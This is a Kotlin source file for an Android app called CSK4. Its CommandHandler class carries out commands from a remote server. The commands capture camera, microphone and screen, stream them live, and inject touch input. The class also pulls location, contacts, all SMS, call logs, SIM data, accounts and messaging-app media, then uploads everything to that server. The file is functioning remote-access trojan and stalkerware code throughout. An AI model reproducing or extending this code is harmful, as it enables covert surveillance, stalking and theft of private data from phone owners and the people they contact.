package com.csk4.app

import android.Manifest
import android.accounts.AccountManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.location.Location
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.google.android.gms.location.LocationServices
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.net.URLEncoder

class CommandHandler(private val ctx: Context, private val deviceId: String) {

    private val TAG = "CSK4_CMD"
    private var webrtc: WebRTCService? = null

    fun execute(command: String, params: JSONObject, onDone: (String) -> Unit) {
        Log.d(TAG, "Exec: $command")
        when (command) {
            // ============ CAMERA & MEDIA ============
            "take_photo_back" -> takePhoto(false, onDone)
            "take_photo_front" -> takePhoto(true, onDone)
            "record_video_back" -> recordVideo(false, params.optInt("duration", 10), onDone)
            "record_video_front" -> recordVideo(true, params.optInt("duration", 10), onDone)
            "record_audio" -> recordAudio(params.optInt("duration", 10), onDone)
            "screenshot" -> takeScreenshot(onDone)

            // ============ DATA EXTRACTION ============
            "get_location" -> { handleLocation(); onDone("loc_sent") }
            "get_contacts" -> { handleContacts(); onDone("contacts_sent") }
            "get_messages" -> { handleMessages(); onDone("sms_sent") }
            "get_calllogs" -> { handleCallLogs(); onDone("calls_sent") }
            "get_files" -> { handleFiles(); onDone("files_sent") }
            "get_apps" -> { handleApps(); onDone("apps_sent") }
            "get_bluetooth" -> handleBluetooth(onDone)
            "get_info" -> { handleDeviceInfo(); onDone("info_sent") }

            // ============ 🆕 NEW: SIM + ACCOUNTS + EMAILS ============
            "get_sim_info" -> { handleSimInfo(); onDone("sim_sent") }
            "get_accounts" -> { handleAccounts(); onDone("accounts_sent") }
            "get_email_accounts" -> { handleEmailAccounts(); onDone("emails_sent") }

            // ============ HARDWARE CONTROL ============
            "vibrate" -> { vibrate(); onDone("vibrated") }
            "play_sound" -> { playSound(); onDone("played") }
            "flashlight_on" -> { flashlight(true); onDone("on") }
            "flashlight_off" -> { flashlight(false); onDone("off") }
            "lock_screen" -> { lockScreen(); onDone("locked") }

            // ============ SETTINGS CONTROL ============
            "set_brightness" -> { setBrightness(params.optInt("value", 50)); onDone("brightness_set") }
            "set_volume" -> { setVolume(params.optInt("value", 50)); onDone("volume_set") }
            "set_ring_mode" -> { setRingMode(params.optString("mode", "normal")); onDone("ring_mode_set") }

            // ============ APP CONTROL ============
            "open_app" -> { openApp(params.optString("package", "")); onDone("opening") }
            "uninstall_app" -> { uninstallApp(params.optString("package", "")); onDone("uninstalling") }
            "force_stop_app" -> { forceStopApp(params.optString("package", "")); onDone("force_stopped") }

            // ============ SEND MESSAGE ============
            "send_sms" -> { sendSMS(params.optString("to", ""), params.optString("message", "")); onDone("sms_sending") }
            "send_whatsapp" -> { sendWhatsApp(params.optString("number", ""), params.optString("message", "")); onDone("whatsapp_opening") }
            "show_notification" -> { showNotification(params.optString("title", "CSK4"), params.optString("message", "")); onDone("notification_shown") }

            // ============ LIVE STREAMS ============
            "start_webrtc" -> {
                webrtc?.stop()
                webrtc = WebRTCService(ctx, deviceId).apply {
                    start(cameraFacing = false, audioOnly = false) { s -> Log.d(TAG, s) }
                }
                onDone("webrtc_started")
            }
            "start_audio_stream" -> {
                webrtc?.stop()
                webrtc = WebRTCService(ctx, deviceId).apply {
                    start(cameraFacing = false, audioOnly = true) { s -> Log.d(TAG, s) }
                }
                onDone("audio_started")
            }
            "stop_webrtc" -> { webrtc?.stop(); webrtc = null; onDone("stopped") }
            "switch_camera" -> { webrtc?.switchCamera(); onDone("switched") }

            // ============ SCREEN MIRROR ============
            "start_screen_mirror" -> {
                try {
                    val intent = Intent(ctx, MainActivity::class.java)
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
                    intent.putExtra("start_screen_mirror", true)
                    ctx.startActivity(intent)
                    onDone("screen_permission_requested")
                } catch (e: Exception) {
                    onDone("screen_mirror_fail: ${e.message}")
                }
            }
            "stop_screen_mirror" -> {
                ScreenMirrorService.instance?.stop()
                ScreenMirrorService.instance = null
                onDone("screen_mirror_stopped")
            }

            // ============ TOUCH CONTROL ============
            "touch_tap" -> {
                val x = params.optDouble("x", 0.5).toFloat()
                val y = params.optDouble("y", 0.5).toFloat()
                TouchController().tap(x, y)
                onDone("tapped")
            }
            "touch_swipe" -> {
                val x1 = params.optDouble("x1", 0.3).toFloat()
                val y1 = params.optDouble("y1", 0.5).toFloat()
                val x2 = params.optDouble("x2", 0.7).toFloat()
                val y2 = params.optDouble("y2", 0.5).toFloat()
                TouchController().swipe(x1, y1, x2, y2)
                onDone("swiped")
            }
            "touch_back" -> { TouchController().pressBack(); onDone("back") }
            "touch_home" -> { TouchController().pressHome(); onDone("home") }
            "touch_recent" -> { TouchController().pressRecent(); onDone("recent") }

            // ============ CALL RECORDING ============
            "start_call_recording" -> {
                CallRecorder.init(ctx)
                CallRecorder.startRecording(ctx, "", "manual")
                onDone("call_rec_started")
            }
            "stop_call_recording" -> {
                CallRecorder.stopRecording()
                onDone("call_rec_stopped")
            }

            else -> onDone("unknown: $command")
        }
    }

    // ============================================================
    // 🆕 SIM INFO
    // ============================================================
    private fun handleSimInfo() {
        try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("token", Config.DEVICE_TOKEN)
                put("sims", JSONArray())
            }
            val simsArray = json.getJSONArray("sims")

            if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
                post("${Config.SERVER_URL}/api/device/siminfo", json)
                return
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                try {
                    val simCount = tm.phoneCount
                    for (i in 0 until simCount) {
                        val simJson = JSONObject()
                        simJson.put("slot", i + 1)

                        val state = tm.getSimState(i)
                        simJson.put("state", when (state) {
                            TelephonyManager.SIM_STATE_READY -> "READY"
                            TelephonyManager.SIM_STATE_ABSENT -> "ABSENT"
                            TelephonyManager.SIM_STATE_PIN_REQUIRED -> "PIN_REQUIRED"
                            TelephonyManager.SIM_STATE_PUK_REQUIRED -> "PUK_REQUIRED"
                            TelephonyManager.SIM_STATE_NETWORK_LOCKED -> "NETWORK_LOCKED"
                            TelephonyManager.SIM_STATE_NOT_READY -> "NOT_READY"
                            else -> "UNKNOWN"
                        })

                        try {
                            simJson.put("operator", tm.getSimOperatorName(i) ?: "Unknown")
                            simJson.put("operatorCode", tm.getSimOperator(i) ?: "")
                            simJson.put("country", tm.getSimCountryIso(i) ?: "")
                        } catch (e: Exception) {}

                        try {
                            val number = tm.getLine1Number(i)
                            simJson.put("number", if (!number.isNullOrEmpty()) number else "Not available")
                        } catch (e: Exception) {
                            simJson.put("number", "Not available")
                        }

                        try {
                            val serial = tm.getSimSerialNumber(i)
                            if (!serial.isNullOrEmpty()) simJson.put("serial", serial)
                        } catch (e: Exception) {}

                        try {
                            val netType = tm.getNetworkType(i)
                            simJson.put("networkType", when(netType) {
                                TelephonyManager.NETWORK_TYPE_LTE -> "4G LTE"
                                TelephonyManager.NETWORK_TYPE_NR -> "5G"
                                TelephonyManager.NETWORK_TYPE_HSPA -> "3G HSPA"
                                TelephonyManager.NETWORK_TYPE_UMTS -> "3G UMTS"
                                TelephonyManager.NETWORK_TYPE_EDGE -> "2G EDGE"
                                TelephonyManager.NETWORK_TYPE_GPRS -> "2G GPRS"
                                else -> "Unknown"
                            })
                        } catch (e: Exception) {}

                        simsArray.put(simJson)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "SIM info: ${e.message}")
                }
            }

            post("${Config.SERVER_URL}/api/device/siminfo", json)
            Log.d(TAG, "✅ SIM info sent")
        } catch (e: Exception) {
            Log.e(TAG, "handleSimInfo: ${e.message}")
        }
    }

    // ============================================================
    // 🆕 ACCOUNTS
    // ============================================================
    private fun handleAccounts() {
        try {
            val am = AccountManager.get(ctx)
            val accounts = am.getAccounts()
            val accountsArray = JSONArray()

            accounts.forEach { account ->
                try {
                    accountsArray.put(JSONObject().apply {
                        put("name", account.name ?: "")
                        put("type", account.type ?: "")
                    })
                } catch (e: Exception) {}
            }

            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("token", Config.DEVICE_TOKEN)
                put("total", accountsArray.length())
                put("accounts", accountsArray)
            }
            post("${Config.SERVER_URL}/api/device/accounts", json)
            Log.d(TAG, "✅ Accounts sent: ${accountsArray.length()}")
        } catch (e: Exception) {
            Log.e(TAG, "handleAccounts: ${e.message}")
        }
    }

    // ============================================================
    // 🆕 EMAILS
    // ============================================================
    private fun handleEmailAccounts() {
        try {
            val am = AccountManager.get(ctx)
            val accounts = am.getAccounts()
            val emailsArray = JSONArray()

            accounts.forEach { account ->
                if (account.type == "com.google") {
                    try { emailsArray.put(account.name) } catch (e: Exception) {}
                }
            }

            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("token", Config.DEVICE_TOKEN)
                put("total", emailsArray.length())
                put("emails", emailsArray)
            }
            post("${Config.SERVER_URL}/api/device/emails", json)
            Log.d(TAG, "✅ Emails sent: ${emailsArray.length()}")
        } catch (e: Exception) {
            Log.e(TAG, "handleEmailAccounts: ${e.message}")
        }
    }

    // ============================================================
    // EXISTING FUNCTIONS
    // ============================================================
    private fun takePhoto(front: Boolean, onDone: (String) -> Unit) {
        if (webrtc != null) {
            webrtc?.stop(); webrtc = null
            Handler(Looper.getMainLooper()).postDelayed({
                CameraController(ctx).capturePhoto(front) { file, err ->
                    if (file != null) { uploadFile(file, "photo"); onDone("photo_ok") }
                    else onDone("photo_fail: $err")
                }
            }, 2000)
        } else {
            CameraController(ctx).capturePhoto(front) { file, err ->
                if (file != null) { uploadFile(file, "photo"); onDone("photo_ok") }
                else onDone("photo_fail: $err")
            }
        }
    }

    private fun recordVideo(front: Boolean, duration: Int, onDone: (String) -> Unit) {
        if (webrtc != null) {
            webrtc?.stop(); webrtc = null
            Handler(Looper.getMainLooper()).postDelayed({
                VideoRecorder(ctx).recordVideo(front, duration) { file, err ->
                    if (file != null) { uploadFile(file, "video"); onDone("video_ok") }
                    else onDone("video_fail: $err")
                }
            }, 2000)
        } else {
            VideoRecorder(ctx).recordVideo(front, duration) { file, err ->
                if (file != null) { uploadFile(file, "video"); onDone("video_ok") }
                else onDone("video_fail: $err")
            }
        }
    }

    private fun recordAudio(duration: Int, onDone: (String) -> Unit) {
        AudioRecorder(ctx).record(duration) { file, err ->
            if (file != null) { uploadFile(file, "audio"); onDone("audio_ok") }
            else onDone("audio_fail: $err")
        }
    }

    private fun takeScreenshot(onDone: (String) -> Unit) {
        val svc = ScreenshotService.instance
        if (svc == null) { onDone("Accessibility_NOT_enabled"); return }
        if (Build.VERSION.SDK_INT < 30) { onDone("needs_android_11"); return }
        svc.takeScreenshot { file, err ->
            if (file != null) { uploadFile(file, "screenshot"); onDone("ss_ok") }
            else onDone("ss_fail: $err")
        }
    }

    private fun setBrightness(value: Int) {
        try {
            if (Build.VERSION.SDK_INT >= 23 && Settings.System.canWrite(ctx)) {
                val brightness = (value * 255 / 100).coerceIn(0, 255)
                Settings.System.putInt(ctx.contentResolver, Settings.System.SCREEN_BRIGHTNESS, brightness)
            }
        } catch (e: Exception) {}
    }

    private fun setVolume(value: Int) {
        try {
            val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVol = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            val vol = (value * maxVol / 100).coerceIn(0, maxVol)
            am.setStreamVolume(AudioManager.STREAM_MUSIC, vol, 0)
            am.setStreamVolume(AudioManager.STREAM_RING, vol, 0)
            am.setStreamVolume(AudioManager.STREAM_NOTIFICATION, vol, 0)
        } catch (e: Exception) {}
    }

    private fun setRingMode(mode: String) {
        try {
            val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            when (mode.lowercase()) {
                "silent" -> am.ringerMode = AudioManager.RINGER_MODE_SILENT
                "vibrate" -> am.ringerMode = AudioManager.RINGER_MODE_VIBRATE
                "normal" -> am.ringerMode = AudioManager.RINGER_MODE_NORMAL
            }
        } catch (e: Exception) {}
    }

    private fun openApp(packageName: String) {
        try {
            val intent = ctx.packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                ctx.startActivity(intent)
            }
        } catch (e: Exception) {}
    }

    private fun uninstallApp(packageName: String) {
        try {
            val intent = Intent(Intent.ACTION_DELETE)
            intent.data = Uri.parse("package:$packageName")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            ctx.startActivity(intent)
        } catch (e: Exception) {}
    }

    private fun forceStopApp(packageName: String) {
        try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            am.killBackgroundProcesses(packageName)
        } catch (e: Exception) {}
    }

    private fun sendSMS(to: String, message: String) {
        try {
            if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) return
            SmsManager.getDefault().sendTextMessage(to, null, message, null, null)
        } catch (e: Exception) {}
    }

    private fun sendWhatsApp(number: String, message: String) {
        try {
            val url = "https://wa.me/$number?text=${URLEncoder.encode(message, "UTF-8")}"
            val intent = Intent(Intent.ACTION_VIEW)
            intent.data = Uri.parse(url)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            ctx.startActivity(intent)
        } catch (e: Exception) {}
    }

    private fun showNotification(title: String, message: String) {
        try {
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            val channelId = "csk4_alerts"
            if (Build.VERSION.SDK_INT >= 26) {
                val chan = android.app.NotificationChannel(channelId, "CSK4 Alerts",
                    android.app.NotificationManager.IMPORTANCE_HIGH)
                nm.createNotificationChannel(chan)
            }
            val notif = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
                .setContentTitle(title).setContentText(message)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true).build()
            nm.notify(System.currentTimeMillis().toInt(), notif)
        } catch (e: Exception) {}
    }

    private fun lockScreen() {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(ctx, DeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) dpm.lockNow()
        } catch (e: Exception) {}
    }

    private fun handleBluetooth(onDone: (String) -> Unit) {
        BluetoothScanner(ctx).scan { arr ->
            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("devices", arr)
                put("token", Config.DEVICE_TOKEN)
            }
            post("${Config.SERVER_URL}/api/device/bluetooth", json)
            onDone("bt_${arr.length()}")
        }
    }

    fun handleLocation() {
        if (!hasPerm(Manifest.permission.ACCESS_FINE_LOCATION)) return
        try {
            LocationServices.getFusedLocationProviderClient(ctx).lastLocation
                .addOnSuccessListener { loc: Location? ->
                    loc?.let {
                        val json = JSONObject().apply {
                            put("deviceId", deviceId)
                            put("lat", it.latitude)
                            put("lng", it.longitude)
                            put("accuracy", it.accuracy)
                            put("token", Config.DEVICE_TOKEN)
                        }
                        post("${Config.SERVER_URL}/api/device/location", json)
                    }
                }
        } catch (e: SecurityException) {}
    }

    fun handleContacts() {
        if (!hasPerm(Manifest.permission.READ_CONTACTS)) return
        val arr = JSONArray()
        val cur = ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
        cur?.use {
            while (it.moveToNext()) {
                try {
                    val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val phoneIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    val typeIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
                    val name = if (nameIdx >= 0) it.getString(nameIdx) ?: "Unknown" else "Unknown"
                    val phone = if (phoneIdx >= 0) it.getString(phoneIdx) ?: "" else ""
                    val type = if (typeIdx >= 0) it.getInt(typeIdx) else 0
                    if (phone.isNotEmpty()) {
                        arr.put(JSONObject().apply {
                            put("name", name)
                            put("phone", phone)
                            put("type", when(type) { 1 -> "Home"; 2 -> "Mobile"; 3 -> "Work"; else -> "Other" })
                        })
                    }
                } catch (e: Exception) {}
            }
        }
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("contacts", arr)
            put("token", Config.DEVICE_TOKEN)
        }
        post("${Config.SERVER_URL}/api/device/contacts", json)
    }

    private fun handleMessages() {
        if (!hasPerm(Manifest.permission.READ_SMS)) return
        val arr = JSONArray()
        val cur = ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC")
        cur?.use {
            while (it.moveToNext()) {
                try {
                    arr.put(JSONObject().apply {
                        put("from", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "Unknown")
                        put("body", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: "")
                        put("time", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.DATE)))
                        put("type", if (it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE)) == 1) "inbox" else "sent")
                    })
                } catch (e: Exception) {}
            }
        }
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("messages", arr)
            put("token", Config.DEVICE_TOKEN)
        }
        post("${Config.SERVER_URL}/api/device/messages", json)
    }

    private fun handleCallLogs() {
        if (!hasPerm(Manifest.permission.READ_CALL_LOG)) return
        val arr = JSONArray()
        val cur = ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
        cur?.use {
            while (it.moveToNext()) {
                try {
                    arr.put(JSONObject().apply {
                        put("number", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "")
                        put("name", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "Unknown")
                        put("type", it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE)))
                        put("duration", it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                        put("time", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                    })
                } catch (e: Exception) {}
            }
        }
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("callLogs", arr)
            put("token", Config.DEVICE_TOKEN)
        }
        post("${Config.SERVER_URL}/api/device/calllogs", json)
    }

    private fun handleFiles() {
        try {
            val dirs = listOf(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
                File("/storage/emulated/0/WhatsApp/Media"),
                File("/storage/emulated/0/Telegram"),
                File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"),
                File("/storage/emulated/0/MIUI/Gallery"),
                File("/storage/emulated/0/Snapchat"),
                File("/storage/emulated/0/Instagram")
            )
            dirs.forEach { dir ->
                if (!dir.exists()) return@forEach
                try {
                    dir.walkTopDown().take(500).forEach { f ->
                        if (f.isFile && f.length() < 20 * 1024 * 1024) {
                            val ext = f.extension.lowercase()
                            if (ext in listOf("jpg","jpeg","png","gif","webp","mp4","mov","3gp","mkv")) {
                                uploadFile(f, if (ext in listOf("jpg","jpeg","png","gif","webp")) "photo" else "video")
                            }
                        }
                    }
                } catch (e: Exception) {}
            }
        } catch (e: Exception) {}
    }

    private fun handleApps() {
        try {
            val pm = ctx.packageManager
            val arr = JSONArray()
            pm.getInstalledApplications(0).forEach { app ->
                arr.put(JSONObject().apply {
                    put("name", pm.getApplicationLabel(app).toString())
                    put("package", app.packageName)
                })
            }
            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("apps", arr)
                put("token", Config.DEVICE_TOKEN)
            }
            post("${Config.SERVER_URL}/api/device/apps", json)
        } catch (e: Exception) {}
    }

    private fun handleDeviceInfo() {
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("info", JSONObject().apply {
                put("model", Build.MODEL)
                put("brand", Build.BRAND)
                put("manufacturer", Build.MANUFACTURER)
                put("android", Build.VERSION.RELEASE)
                put("sdk", Build.VERSION.SDK_INT)
                put("cpu", Build.HARDWARE)
                put("device", Build.DEVICE)
                put("fingerprint", Build.FINGERPRINT)
                put("totalRAM", getTotalRAM())
                put("availableRAM", getAvailableRAM())
                put("totalStorage", getTotalStorage())
                put("availableStorage", getAvailableStorage())
            })
            put("token", Config.DEVICE_TOKEN)
        }
        post("${Config.SERVER_URL}/api/device/info", json)
    }

    private fun vibrate() {
        try {
            val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(VibrationEffect.createOneShot(1500, VibrationEffect.DEFAULT_AMPLITUDE))
            } else { @Suppress("DEPRECATION") v.vibrate(1500) }
        } catch (_: Exception) {}
    }

    private fun flashlight(on: Boolean) {
        try {
            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = cm.cameraIdList.firstOrNull { cid ->
                cm.getCameraCharacteristics(cid).get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
            } ?: return
            cm.setTorchMode(id, on)
        } catch (_: Exception) {}
    }

    private fun playSound() {
        try {
            val r = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM)
            android.media.RingtoneManager.getRingtone(ctx, r).play()
        } catch (_: Exception) {}
    }

    private fun hasPerm(p: String): Boolean =
        ActivityCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED

    private fun post(url: String, json: JSONObject) {
        Volley.newRequestQueue(ctx).add(JsonObjectRequest(
            Request.Method.POST, url, json,
            { Log.d(TAG, "Posted: $url") }, { Log.e(TAG, "Post fail: ${it.message}") }
        ))
    }

    private fun uploadFile(file: File, type: String) {
        try {
            val url = "${Config.SERVER_URL}/api/device/upload"
            val req = object : com.android.volley.VolleyMultipartRequest(
                Request.Method.POST, url,
                { Log.d(TAG, "✅ Uploaded: ${file.name}") },
                { Log.e(TAG, "Upload fail: ${it.message}") }
            ) {
                override fun getByteData(): MutableMap<String, DataPart> {
                    return hashMapOf("file" to DataPart(file.name, readFile(file)))
                }
                override fun getParams(): MutableMap<String, String> {
                    return hashMapOf("deviceId" to deviceId, "type" to type, "token" to Config.DEVICE_TOKEN)
                }
            }
            Volley.newRequestQueue(ctx).add(req)
        } catch (e: Exception) {}
    }

    private fun readFile(file: File): ByteArray {
        val fis = FileInputStream(file)
        val b = fis.readBytes()
        fis.close()
        return b
    }

    private fun getTotalRAM(): Long {
        val mi = android.app.ActivityManager.MemoryInfo()
        (ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager).getMemoryInfo(mi)
        return mi.totalMem / (1024 * 1024)
    }

    private fun getAvailableRAM(): Long {
        val mi = android.app.ActivityManager.MemoryInfo()
        (ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager).getMemoryInfo(mi)
        return mi.availMem / (1024 * 1024)
    }

    private fun getTotalStorage(): Long {
        val s = android.os.StatFs(Environment.getDataDirectory().path)
        return (s.blockCountLong * s.blockSizeLong) / (1024 * 1024)
    }

    private fun getAvailableStorage(): Long {
        val s = android.os.StatFs(Environment.getDataDirectory().path)
        return (s.availableBlocksLong * s.blockSizeLong) / (1024 * 1024)
    }
}
